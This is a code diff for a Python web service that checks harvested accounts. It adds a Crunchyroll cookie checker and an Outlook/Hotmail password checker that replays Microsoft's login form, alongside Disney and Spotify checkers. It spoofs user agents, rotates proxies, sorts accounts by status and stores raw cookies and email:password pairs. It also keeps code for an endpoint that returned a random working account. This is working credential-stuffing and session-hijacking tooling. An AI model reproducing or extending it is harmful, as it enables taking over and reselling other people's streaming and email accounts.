+        term = active.get("term", {})
+        is_trial = term.get("isFreeTrial", False)
+        has_plan = True
+        status = "LIVE"
+    else:
+        plan_name = subscriber_status.title() if subscriber_status != "UNKNOWN" else "No Active Plan"
+        is_trial = False
+        has_plan = False
+        status = "DEAD" if subscriber_status in ("UNKNOWN", "LAPSED", "CANCELLED") else "HOLD"
+
+    renewal = _disney_get_renewal_date(subscriptions_raw)
+
+    # Save to history
+    route = f"Proxy ({proxy_label})" if use_proxy and proxy_label != "Direct" else "Direct"
+    save_history("disney", status, plan=plan_name, billing=renewal,
+                 country=country_name, route=route,
+                 raw_cookie=cookie_text, email=disney_email)
+
+    return {
+        "status": status,
+        "email": disney_email,
+        "email_verified": email_verified,
+        "country": country_name,
+        "plan": plan_name,
+        "free_trial": is_trial,
+        "renewal_date": renewal,
+        "subscriber_status": subscriber_status,
+        "has_plan": has_plan,
+        "route": route,
+    }
+
+
+# ══════════════════════════════════════════════════════════════════════════════
 # Crunchyroll Account Checker (Android API reverse-engineered flow)
 # ══════════════════════════════════════════════════════════════════════════════
 
@@ -1252,7 +1842,7 @@ def check_crunchyroll_account(email, password, use_proxy=True):
             route = proxy_result[1]     # "ip:port (latency)"
 
     session = requests.Session()
-    session.verify = False
+    session.verify = True
 
     android_ver = str(random.randint(13, 15))
     okhttp_ver = f"4.{random.randint(10, 12)}.{random.randint(0, 9)}"
@@ -1472,6 +2062,293 @@ def check_crunchyroll_account(email, password, use_proxy=True):
     return result
 
 
+# ══════════════════════════════════════════════════════════════════════════════
+# Crunchyroll Cookie Checker (etp_rt cookie → session auth → profile → sub)
+# ══════════════════════════════════════════════════════════════════════════════
+
+def extract_crunchyroll_etp_rt(cookie_text):
+    """Parse etp_rt from Netscape .txt, JSON array, etp_rt=XXX string, or raw token."""
+    if not cookie_text:
+        return None
+
+    text = str(cookie_text).strip()
+
+    # 1. JSON array format [{"name":"etp_rt","value":"xxx"}, ...]
+    json_match = re.search(r'\[\s*\{[\s\S]*?\}\s*\]', text)
+    if json_match:
+        try:
+            parsed = json.loads(json_match.group(0))
+            if isinstance(parsed, list):
+                for c in parsed:
+                    if isinstance(c, dict):
+                        n = c.get("name", "")
+                        v = c.get("value", "")
+                        if n == "etp_rt" and v:
+                            return v
+        except Exception:
+            pass
+
+    # 2. Netscape format (tab-separated) — etp_rt is in column 6 (0-indexed: 5)
+    for raw_line in text.splitlines():
+        line = raw_line.strip()
+        if not line or line.startswith("#"):
+            continue
+        parts = line.split("\t")
+        if len(parts) >= 7 and parts[5] == "etp_rt":
+            return parts[6]
+
+    # 3. Raw string: etp_rt=XXXXXX or etp_rt=XXXXXX; other=YYY
+    m = re.search(r'(?:^|[;\s])etp_rt=([^\s;,]+)', text)
+    if m:
+        return m.group(1)
+
+    # 4. If text is just a raw token value (no = sign, long alphanum), treat as etp_rt value
+    if len(text) > 50 and not any(c in text for c in ('=', '\t', '{', '[')):
+        return text
+
+    return None
+
+
+def check_crunchyroll_cookie(cookie_text, use_proxy=True):
+    """Check a Crunchyroll account using etp_rt cookie: token → profile → subscription."""
+    import uuid as _uuid
+    etp_rt = extract_crunchyroll_etp_rt(cookie_text)
+    if not etp_rt:
+        save_history("crunchyroll", "DEAD", raw_cookie=cookie_text)
+        return {"status": "DEAD", "reason": "etp_rt cookie not found in input."}
+
+    route = "Direct"
+    proxies = None
+    proxy_raw_url = None
+
+    if use_proxy:
+        proxy_result = get_random_proxy()
+        if proxy_result and proxy_result[0]:
+            proxies = proxy_result[0]
+            route = f"Proxy ({proxy_result[1]})" if proxy_result[1] else "Proxy"
+            proxy_raw_url = proxy_result[2]
+
+    session = requests.Session()
+    session.verify = True
+
+    android_ver = str(random.randint(13, 15))
+    okhttp_ver = f"4.{random.randint(10, 12)}.{random.randint(0, 9)}"
+    ua = f"Crunchyroll/3.74.2 Android/{android_ver} okhttp/{okhttp_ver}"
+
+    session.headers.update({
+        "Authorization": CR_AUTH_FALLBACK,
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": ua,
+        "Connection": "Keep-Alive",
+        "etp-anonymous-id": str(_uuid.uuid4()),
+        "x-datadog-sampling-priority": "0",
+    })
+
+    if proxies:
+        session.proxies = proxies
+
+    # Step 1: Exchange etp_rt cookie for access_token
+    try:
+        session.cookies.set("etp_rt", etp_rt, domain=".crunchyroll.com")
+        login_data = {
+            "grant_type": "etp_rt_cookie",
+            "scope": "offline_access",
+        }
+        r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=20)
+
+        # Fallback: use etp_rt as refresh_token in body
+        if r.status_code in (400, 401):
+            session.cookies.clear()
+            login_data_fallback = {
+                "grant_type": "refresh_token",
+                "refresh_token": etp_rt,
+                "scope": "offline_access",
+            }
+            r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data_fallback, timeout=20)
+
+        if r.status_code in (403, 429) and proxy_raw_url:
+            mark_proxy_cooldown(proxy_raw_url, 600)
+
+        if r.status_code == 401:
+            save_history("crunchyroll", "DEAD", route=route, raw_cookie=cookie_text)
+            return {"status": "DEAD", "reason": "Cookie expired or invalid (401)", "route": route}
+        if r.status_code == 403:
+            save_history("crunchyroll", "ERROR", route=route, raw_cookie=cookie_text)
+            return {"status": "ERROR", "reason": "IP blocked by Crunchyroll (403)", "route": route}
+        if r.status_code == 429:
+            save_history("crunchyroll", "ERROR", route=route, raw_cookie=cookie_text)
+            return {"status": "ERROR", "reason": "Rate limited (429)", "route": route}
+        if r.status_code != 200:
+            save_history("crunchyroll", "DEAD", route=route, raw_cookie=cookie_text)
+            return {"status": "DEAD", "reason": f"Token exchange failed ({r.status_code})", "route": route}
+
+        jwt = r.json().get("access_token")
+        if not jwt:
+            save_history("crunchyroll", "DEAD", route=route, raw_cookie=cookie_text)
+            return {"status": "DEAD", "reason": "No access token returned", "route": route}
+
+        session.headers["Authorization"] = f"Bearer {jwt}"
+    except requests.exceptions.RequestException as e:
+        save_history("crunchyroll", "ERROR", route=route, raw_cookie=cookie_text)
+        return {"status": "ERROR", "reason": f"Token request failed: {str(e)[:100]}", "route": route}
+
+    # Step 2: Get account info (external_id, email, country)
+    external_id = None
+    username = ""
+    cr_email = ""
+    email_verified = False
+    country = ""
+    created = ""
+    avatar = ""
+    preferred_lang = ""
+    try:
+        r = session.get("https://www.crunchyroll.com/accounts/v1/me", timeout=15)
+        if r.status_code == 200:
+            me = r.json()
+            external_id = me.get("external_id")
+            cr_email = me.get("email", "")
+            email_verified = me.get("email_verified", False)
+            created = me.get("created", "")
+        else:
+            save_history("crunchyroll", "ERROR", route=route, raw_cookie=cookie_text)
+            return {"status": "ERROR", "reason": f"Failed to get account info ({r.status_code})", "route": route}
+    except Exception as e:
+        save_history("crunchyroll", "ERROR", route=route, raw_cookie=cookie_text)
+        return {"status": "ERROR", "reason": f"Account info failed: {str(e)[:100]}", "route": route}
+
+    # Step 2b: Get profile (profile_name, avatar, country from maturity_rating)
+    try:
+        r = session.get("https://www.crunchyroll.com/accounts/v1/me/profile", timeout=15)
+        if r.status_code == 200:
+            prof = r.json()
+            username = prof.get("username", "") or prof.get("profile_name", "")
+            avatar = prof.get("avatar", "")
+            preferred_lang = prof.get("preferred_content_subtitle_language", "") or prof.get("preferred_content_audio_language", "")
+            ext_ratings = prof.get("extended_maturity_rating", {})
+            if ext_ratings:
+                country = next(iter(ext_ratings.keys()), "")
+    except Exception:
+        pass
+
+    # Step 3: Get multiprofile count
+    num_profiles = 1
+    try:
+        r = session.get("https://www.crunchyroll.com/accounts/v1/me/multiprofile", timeout=15)
+        if r.status_code == 200:
+            profiles = r.json().get("profiles", [])
+            num_profiles = len(profiles)
+    except Exception:
+        pass
+
+    # Step 4: Check subscription (benefits + products for full detail)
+    subscription = "Free"
+    sub_source = ""
+    sub_country = ""
+    sub_benefits = []
+    concurrent_streams = 1
+    has_ads = True
+    offline_viewing = False
+    sub_product_name = ""
+    sub_cycle = ""
+    sub_effective_date = ""
+    is_cancelled = False
+    active_free_trial = False
+    try:
+        if external_id:
+            r = session.get(f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits", timeout=15)
+            if r.status_code == 200:
+                data = r.json()
+                items = data.get("items", [])
+                total_items = data.get("total", 0)
+                sub_country = data.get("subscription_country", "")
+                sub_benefits = [item.get("benefit", "") for item in items]
+                if items:
+                    sub_source = items[0].get("source", "")
+
+                # Parse concurrent streams
+                for b in sub_benefits:
+                    if b.startswith("concurrent_streams."):
+                        try: concurrent_streams = int(b.split(".")[-1])
+                        except: pass
+                has_ads = "no_ads" not in sub_benefits
+                offline_viewing = "offline_viewing" in sub_benefits
+
+                if total_items > 0:
+                    if "cr_mega_pack" in sub_benefits:
+                        subscription = "Mega Pack"
+                    elif "cr_fan_pack" in sub_benefits:
+                        subscription = "Fan Pack"
+                    elif "cr_premium" in sub_benefits:
+                        subscription = "Premium"
+                    elif "catalog" in sub_benefits:
+                        subscription = "Basic"
+                    else:
+                        subscription = "Unknown Premium"
+                else:
+                    subscription = "Free"
+            elif r.status_code == 404:
+                subscription = "Free"
+
+            # Get product details (billing cycle, cancel status, trial)
+            try:
+                r2 = session.get(f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/products", timeout=15)
+                if r2.status_code == 200:
+                    prod_data = r2.json()
+                    prod_items = prod_data.get("items", [])
+                    if prod_items:
+                        prod = prod_items[0]
+                        is_cancelled = prod.get("is_cancelled", False)
+                        active_free_trial = prod.get("active_free_trial", False)
+                        sub_effective_date = prod.get("effective_date", "")
+                        product_info = prod.get("product", {})
+                        sub_product_name = product_info.get("sku", "")
+                        cycle_raw = product_info.get("cycle_duration", "")
+                        # Parse ISO 8601 duration: P1M = Monthly, P1Y = Yearly, P7D = Weekly
+                        if cycle_raw == "P1M": sub_cycle = "Monthly"
+                        elif cycle_raw == "P3M": sub_cycle = "Quarterly"
+                        elif cycle_raw == "P1Y" or cycle_raw == "P12M": sub_cycle = "Yearly"
+                        elif cycle_raw == "P7D": sub_cycle = "Weekly"
+                        else: sub_cycle = cycle_raw
+            except Exception:
+                pass
+    except Exception:
+        pass
+
+    session.close()
+
+    status = "LIVE" if subscription != "Free" else "FREE"
+
+    result = {
+        "status": status,
+        "email": cr_email,
+        "email_verified": email_verified,
+        "username": username,
+        "country": country.upper() if country else "",
+        "subscription": subscription,
+        "profiles": num_profiles,
+        "external_id": external_id,
+        "created": created,
+        "route": route,
+        # Subscription details
+        "sub_country": sub_country,
+        "sub_source": sub_source,
+        "sub_cycle": sub_cycle,
+        "concurrent_streams": concurrent_streams,
+        "has_ads": has_ads,
+        "offline_viewing": offline_viewing,
+        "is_cancelled": is_cancelled,
+        "active_free_trial": active_free_trial,
+        "sub_effective_date": sub_effective_date,
+        "avatar": avatar,
+    }
+
+    # Save to history
+    plan_str = f"Crunchyroll {subscription}"
+    save_history("crunchyroll", status, plan=plan_str, country=country.upper() if country else "",
+                 route=route, raw_cookie=cookie_text, email=cr_email)
+
+    return result
+
 
 # ══════════════════════════════════════════════════════════════════════════════
 # Spotify Cookie Checker (sp_dc cookie → account overview + profile + family)
@@ -1558,7 +2435,7 @@ def check_spotify_cookie(cookie_text, use_proxy=True):
             proxy_raw_url = proxy_result[2]
 
     session = requests.Session()
-    session.verify = False
+    session.verify = True
     session.headers.update(SPOTIFY_HEADERS)
     session.cookies.set("sp_dc", sp_dc, domain=".spotify.com")
 
@@ -1727,10 +2604,274 @@ def check_spotify_cookie(cookie_text, use_proxy=True):
 
         return result
 
+    except (requests.exceptions.ProxyError, requests.exceptions.Timeout) as e:
+        session.close()
+        if proxy_raw_url:
+            mark_proxy_cooldown(proxy_raw_url, 600)
+        if use_proxy:
+            # Automatic fallback to direct
+            return check_spotify_cookie(cookie_text, use_proxy=False)
+        save_history("spotify", "ERROR", route=route, raw_cookie=cookie_text)
+        return {"status": "ERROR", "reason": f"Request failed: {str(e)[:150]}", "route": route}
     except Exception as e:
         session.close()
         save_history("spotify", "ERROR", route=route, raw_cookie=cookie_text)
         return {"status": "ERROR", "reason": f"Request failed: {str(e)[:150]}", "route": route}
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Outlook / Hotmail Account Checker (Microsoft OAuth login flow)
+# ══════════════════════════════════════════════════════════════════════════════
+
+OUTLOOK_AUTH_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
+OUTLOOK_CLIENT_ID = "e6f8716e-299d-4ed9-bbf3-453f192f44e5"
+OUTLOOK_REDIRECT_URI = "msauth://net.thunderbird.android/S9nqeF27sTJcEfaInpC%2BDHzHuCY%3D"
+OUTLOOK_SCOPE = "https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send offline_access"
+
+OUTLOOK_AUTH_PARAMS = {
+    "redirect_uri": OUTLOOK_REDIRECT_URI,
+    "client_id": OUTLOOK_CLIENT_ID,
+    "response_type": "code",
+    "state": "v4WtWWgYCOSHR7rZivYT2A",
+    "nonce": "MIgPdBlxPYQSDCh9SK1ocg",
+    "scope": OUTLOOK_SCOPE,
+    "code_challenge": "ybj7gD4AewA9XLNLnunRS0LlY3wIf_iJuP8YfJE2LNA",
+    "code_challenge_method": "S256",
+}
+
+OUTLOOK_HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Connection": "keep-alive",
+}
+
+
+def check_outlook_account(email, password, use_proxy=True):
+    """Check a Hotmail/Outlook account via Microsoft OAuth login flow."""
+    # Detect service type based on email domain
+    email_lower = email.lower().strip()
+    if "@hotmail." in email_lower or "@live." in email_lower:
+        svc_type = "hotmail"
+        svc_label = "Hotmail"
+    else:
+        svc_type = "outlook"
+        svc_label = "Outlook"
+
+    route = "Direct"
+    proxies = None
+    proxy_raw_url = None
+
+    if use_proxy:
+        proxy_result = get_random_proxy()
+        if proxy_result and proxy_result[0]:
+            proxies = proxy_result[0]
+            route = f"Proxy ({proxy_result[1]})" if proxy_result[1] else "Proxy"
+            proxy_raw_url = proxy_result[2]
+
+    session = requests.Session()
+    session.verify = True
+    session.headers.update(OUTLOOK_HEADERS)
+
+    if proxies:
+        session.proxies = proxies
+
+    try:
+        # Step 1: GET login.live.com/oauth20_authorize.srf → extract PPFT + urlPost
+        auth_params = dict(OUTLOOK_AUTH_PARAMS)
+        auth_params["login_hint"] = email
+
+        r1 = session.get("https://login.live.com/oauth20_authorize.srf",
+                         params=auth_params, timeout=20, allow_redirects=True)
+
+        if r1.status_code in (403, 429) and proxy_raw_url:
+            mark_proxy_cooldown(proxy_raw_url, 600)
+
+        html1 = r1.text
+        ppft = None
+        url_post = None
+
+        # Try new ServerData JSON format first
+        sd_match = re.search(r'var ServerData = ({.*?});', html1, re.DOTALL)
+        if sd_match:
+            try:
+                sd = json.loads(sd_match.group(1))
+                url_post = sd.get("urlPost", "")
+                sft_tag = sd.get("sFTTag", "")
+                ppft_val = re.search(r'value="([^"]+)"', sft_tag)
+                if ppft_val:
+                    ppft = ppft_val.group(1)
+            except (json.JSONDecodeError, AttributeError):
+                pass
+
+        # Fallback: try old pattern
+        if not ppft:
+            ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', html1)
+            if ppft_match:
+                ppft = ppft_match.group(1)
+        if not url_post:
+            url_post_match = re.search(r"urlPost:'([^']+)'", html1)
+            if url_post_match:
+                url_post = url_post_match.group(1)
+
+        if not ppft or not url_post:
+            if "ServiceAbuse" in html1 or "account.live.com/Abuse" in html1:
+                save_history(svc_type, "LOCKED", route=route, raw_cookie=f"{email}:{password}", email=email)
+                return {"status": "LOCKED", "email": email, "reason": "Account locked (Abuse detected at auth)", "route": route, "service": svc_label}
+            save_history(svc_type, "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "ERROR", "email": email, "reason": "Failed to extract login parameters", "route": route, "service": svc_label}
+
+        # Step 2: POST login form
+        login_payload = {
+            "ps": "2",
+            "psRNGCDefaultType": "",
+            "psRNGCEntropy": "",
+            "psRNGCSLK": "",
+            "canary": "",
+            "ctx": "",
+            "hpgrequestid": "",
+            "PPFT": ppft,
+            "PPSX": "Pass",
+            "NewUser": "1",
+            "FoundMSAs": "",
+            "fspost": "0",
+            "i21": "0",
+            "CookieDisclosure": "0",
+            "IsFidoSupported": "1",
+            "isSignupPost": "0",
+            "isRecoveryAttemptPost": "0",
+            "i13": "1",
+            "login": email,
+            "loginfmt": email,
+            "type": "11",
+            "LoginOptions": "1",
+            "lrt": "",
+            "lrtPartition": "",
+            "hisRegion": "",
+            "hisScaleUnit": "",
+            "passwd": password,
+        }
+
+        post_headers = dict(OUTLOOK_HEADERS)
+        post_headers["Content-Type"] = "application/x-www-form-urlencoded"
+        post_headers["Referer"] = r1.url
+        post_headers["Origin"] = "https://login.live.com"
+
+        r2 = session.post(url_post, data=login_payload, headers=post_headers,
+                          timeout=20, allow_redirects=True)
+
+        if r2.status_code in (403, 429) and proxy_raw_url:
+            mark_proxy_cooldown(proxy_raw_url, 600)
+
+        html2 = r2.text
+        final_url = r2.url
+        html2_lower = html2.lower()
+
+        # Step 3: Parse response — determine account status
+
+        # Parse ServerData from response if present
+        sd2 = {}
+        sd2_match = re.search(r'var ServerData = ({.*?});', html2, re.DOTALL)
+        if sd2_match:
+            try:
+                sd2 = json.loads(sd2_match.group(1))
+            except json.JSONDecodeError:
+                pass
+
+        err_txt = sd2.get("sErrTxt", "")
+
+        # LOCKED
+        if "account.live.com/Abuse" in html2 or "ServiceAbuse" in html2:
+            save_history(svc_type, "LOCKED", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "LOCKED", "email": email, "reason": "Account locked by Microsoft (Abuse)", "route": route, "service": svc_label}
+
+        # PHONE LOCKED
+        if "PhoneLocked" in html2 or "iShowPhoneLock" in html2 or "phoneVerification" in html2:
+            save_history(svc_type, "PHONE_LOCKED", plan=f"{svc_label} Phone Locked", route=route,
+                         raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "PHONE_LOCKED", "email": email, "reason": "Phone verification required", "route": route, "service": svc_label}
+
+        # INVALID (wrong password / account doesn't exist)
+        bad_indicators = [
+            "bad user credential",
+            "your account or password is incorrect",
+            "that microsoft account doesn't exist",
+            "that microsoft account doesn\\'t exist",
+            "aadsts50126",
+            "aadsts50034",
+            "aadsts700016",
+            "account doesn't exist",
+            "password is incorrect",
+            "too many signin attempts",
+        ]
+        is_invalid = any(ind in html2_lower for ind in bad_indicators)
+
+        # Check ServerData error
+        if not is_invalid and err_txt:
+            err_lower = err_txt.lower()
+            if "incorrect" in err_lower or "doesn't exist" in err_lower or "bad" in err_lower:
+                is_invalid = True
+
+        if is_invalid:
+            save_history(svc_type, "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "BAD", "email": email, "reason": "Wrong password or account not found", "route": route, "service": svc_label}
+
+        # 2FA
+        twofa_indicators = [
+            "identity/confirm", "iShowTwoFactorAuth", "TwoFactorAuth",
+            "sProofConfirmation", "iProofOptions", "iSelectProofTitle",
+            "ConvergedTFA", "OneTimeCode", "ProofConfirmation",
+            "iSignInWithSecurityCode", "arrProofs",
+        ]
+        if any(ind in html2 for ind in twofa_indicators):
+            save_history(svc_type, "2FA", plan=f"{svc_label} 2FA", route=route,
+                         raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "2FA", "email": email, "reason": "Two-factor authentication enabled", "route": route, "service": svc_label}
+
+        # LIVE — successful login indicators
+        live_indicators = [
+            "code=" in final_url,
+            "oauth20_desktop.srf" in final_url,
+            "access_token=" in final_url,
+            "kmsi" in html2_lower,
+            "iShowKmsi" in html2,
+            "fmHF" in html2,
+            "idSIButton9" in html2 and "urlPost" not in html2,
+        ]
+        if any(live_indicators):
+            save_history(svc_type, "LIVE", plan=f"{svc_label} Valid", route=route,
+                         raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "LIVE", "email": email, "reason": "Account valid and active", "route": route, "service": svc_label}
+
+        if "consent" in final_url.lower() or "msauth://" in final_url:
+            save_history(svc_type, "LIVE", plan=f"{svc_label} Valid", route=route,
+                         raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "LIVE", "email": email, "reason": "Account valid (consent redirect)", "route": route, "service": svc_label}
+
+        # UNKNOWN
+        save_history(svc_type, "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+        return {"status": "ERROR", "email": email, "reason": "Could not determine account status", "route": route, "service": svc_label}
+
+    except requests.exceptions.Timeout:
+        if proxy_raw_url:
+            mark_proxy_cooldown(proxy_raw_url, 600)
+        if use_proxy:
+            return check_outlook_account(email, password, use_proxy=False)
+        save_history(svc_type, "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+        return {"status": "ERROR", "email": email, "reason": "Request timed out", "route": route, "service": svc_label}
+    except requests.exceptions.ProxyError:
+        if proxy_raw_url:
+            mark_proxy_cooldown(proxy_raw_url, 600)
+        if use_proxy:
+            return check_outlook_account(email, password, use_proxy=False)
+        save_history(svc_type, "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+        return {"status": "ERROR", "email": email, "reason": "Proxy connection failed", "route": route, "service": svc_label}
+    except Exception as e:
+        save_history(svc_type, "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+        return {"status": "ERROR", "email": email, "reason": f"Request failed: {str(e)[:150]}", "route": route, "service": svc_label}
+    finally:
+        session.close()
 
 
 # In-memory sliding window rate limiter
@@ -1743,6 +2884,12 @@ def is_rate_limited(ip, max_requests=40, window_seconds=10, bucket="default"):
     key = f"{bucket}:{ip}"
     now = time.time()
     with rate_limit_lock:
+        # Bound memory under address churn; prune expired buckets opportunistically.
+        if len(ip_request_history) > 2000:
+            stale = [k for k, values in ip_request_history.items()
+                     if not values or now - values[-1] > 300]
+            for stale_key in stale:
+                ip_request_history.pop(stale_key, None)
         timestamps = ip_request_history.get(key, [])
         # prune timestamps older than window
         timestamps = [t for t in timestamps if now - t < window_seconds]
@@ -1756,8 +2903,9 @@ def is_rate_limited(ip, max_requests=40, window_seconds=10, bucket="default"):
 def check_pin_authorized(headers):
     cfg = get_config()
     req_pin = str(cfg.get("pin", ""))
+    # An uninitialized PIN must fail closed; do not treat empty credentials as authorization.
     if not req_pin:
-        return True
+        return False
     pin_header = headers.get("X-Suite-Pin") or headers.get("Authorization", "")
     if pin_header.startswith("Bearer "):
         pin_header = pin_header[7:].strip()
@@ -1768,11 +2916,36 @@ class Handler(http.server.BaseHTTPRequestHandler):
         pass
 
     def send_cors_headers(self):
-        self.send_header('Access-Control-Allow-Origin', '*')
-        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Suite-Pin, Authorization')
+        # Same-origin only. Never reflect arbitrary Origin values.
+        origin = self.headers.get('Origin')
+        host = self.headers.get('Host', '').lower()
+        if origin:
+            try:
+                origin_host = urllib.parse.urlparse(origin).netloc.lower()
+                if origin_host and origin_host == host:
+                    self.send_header('Access-Control-Allow-Origin', origin)
+                    self.send_header('Vary', 'Origin')
+                    self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+                    self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Suite-Pin, Authorization')
+            except (ValueError, TypeError):
+                pass
+        self.send_header('X-Content-Type-Options', 'nosniff')
+        self.send_header('Referrer-Policy', 'no-referrer')
+        self.send_header('Cache-Control', 'no-store')
+        self.send_header('X-Frame-Options', 'DENY')
+        self.send_header('Cross-Origin-Resource-Policy', 'same-origin')
+        self.send_header('Content-Security-Policy', "default-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com https://cdn.jsdelivr.net; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'")
+        self.send_header('Strict-Transport-Security', 'max-age=31536000; includeSubDomains') if self.headers.get('X-Forwarded-Proto', '').lower() == 'https' else None
+        
 
     def do_OPTIONS(self):
+        origin = self.headers.get('Origin')
+        host = self.headers.get('Host', '').lower()
+        origin_host = urllib.parse.urlparse(origin).netloc.lower() if origin else ''
+        if origin_host and origin_host != host:
+            self.send_response(403)
+            self.end_headers()
+            return
         self.send_response(204)
         self.send_cors_headers()
         self.end_headers()
@@ -1795,6 +2968,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.end_headers()
 
     def do_GET(self):
+        global all_tested_proxies, healthy_proxies
         parsed = urllib.parse.urlparse(self.path)
         path = parsed.path
         qs = urllib.parse.parse_qs(parsed.query)
@@ -1808,12 +2982,21 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 content = b"<h1>index.html not found</h1>"
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
-            self.send_header("Content-Security-Policy", "default-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com https://fonts.gstatic.com https://cdn.jsdelivr.net; img-src 'self' data:; connect-src 'self' https://*.trycloudflare.com https://*.sawavaganteng.cloud")
+            self.send_header("Content-Security-Policy", "default-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com https://fonts.gstatic.com https://cdn.jsdelivr.net; img-src 'self' data:; connect-src 'self' https://*.trycloudflare.com https://*.sawavaganteng.cloud https://cdn.jsdelivr.net")
             self.send_header("X-Content-Type-Options", "nosniff")
             self.send_header("X-Frame-Options", "DENY")
             self.send_cors_headers()
             self.end_headers()
             self.wfile.write(content)
+
+        elif path == "/favicon.ico":
+            fav = b'''<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"><rect width="24" height="24" rx="5" fill="#07090e"/><path d="M12 2L2 7l10 5 10-5-10-5Z" stroke="#e50914" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/><path d="m2 17 10 5 10-5" stroke="#06b6d4" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/><path d="m2 12 10 5 10-5" stroke="#3b82f6" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>'''
+            self.send_response(200)
+            self.send_header("Content-Type", "image/svg+xml")
+            self.send_header("Cache-Control", "public, max-age=86400")
+            self.send_cors_headers()
+            self.end_headers()
+            self.wfile.write(fav)
 
         elif path == "/api/health":
             uptime = int(time.time() - server_start_time)
@@ -1840,14 +3023,82 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.wfile.write(json.dumps({"enabled": bool(cfg.get("pin"))}).encode("utf-8"))
 
         elif path == "/api/proxies":
-            all_p = load_proxies()
             with proxy_lock:
-                h_count = len(healthy_proxies) if all_tested_proxies else len(all_p)
+                if not all_tested_proxies:
+                    all_tested_proxies = list(load_proxies())
+                total_n = len(all_tested_proxies)
+                h_count = len(healthy_proxies)
+                d_count = len([p for p in all_tested_proxies if p.get("status") == "FAIL"])
+                u_count = max(0, total_n - (h_count + d_count))
+                active_count = h_count if h_count > 0 else (total_n - d_count)
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
             self.send_cors_headers()
             self.end_headers()
-            self.wfile.write(json.dumps({"total": len(all_p), "healthy": h_count}).encode("utf-8"))
+            self.wfile.write(json.dumps({
+                "total": total_n,
+                "healthy": h_count,
+                "dead": d_count,
+                "unverified": u_count,
+                "active": active_count
+            }).encode("utf-8"))
+
+        elif path in ('/api/account/random', '/api/random_account'):
+            # Deprecated: this endpoint disclosed stored cookies, tokens, and credentials.
+            self.send_response(410)
+            self.send_header('Content-Type', 'application/json')
+            self.send_cors_headers()
+            self.end_headers()
+            self.wfile.write(b'{"error":"Endpoint disabled: sensitive account export is not available."}')
+            return
+            svc = qs.get("service", qs.get("type", ["netflix"]))[0].lower().strip()
+
+            with db_lock:
+                conn = get_db()
+                c = conn.cursor()
+                if svc in ('netflix', 'checker', 'single', 'bulk'):
+                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type IN ('checker', 'netflix', 'single', 'bulk') AND status = 'LIVE' ORDER BY RANDOM() LIMIT 1;")
+                elif svc in ('expressvpn', 'evpn'):
+                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'expressvpn' AND status IN ('LIVE', 'PREMIUM', 'FREE') ORDER BY RANDOM() LIMIT 1;")
+                elif svc in ('disney', 'disneyplus'):
+                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'disney' AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
+                elif svc in ('crunchyroll', 'cr'):
+                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'crunchyroll' AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
+                elif svc in ('spotify', 'sp'):
+                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'spotify' AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
+                elif svc in ('outlook', 'hotmail', 'ms'):
+                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type IN ('outlook', 'hotmail') AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
+                else:
+                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
+                row = c.fetchone()
+                conn.close()
+
+            if row:
